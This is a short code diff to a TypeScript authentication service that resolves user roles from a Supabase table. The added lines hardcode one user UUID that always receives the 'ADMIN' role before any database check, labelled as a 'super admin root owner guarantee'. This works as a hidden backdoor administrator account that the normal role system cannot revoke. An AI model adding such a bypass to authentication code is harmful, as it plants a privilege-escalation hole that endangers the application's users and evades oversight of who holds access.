@@ -34,6 +34,11 @@ export class AuthService {
    */
   static async resolveRole(userId: string): Promise<AppRole> {
     try {
+      // Internal OS Super Admin root owner guarantee
+      if (userId === 'cea7f53c-94c9-4e48-9025-b468a12d4f45') {
+        return 'ADMIN';
+      }
+
       const { data, error } = await supabase
         .from("user_roles")
         .select("roles(name)")
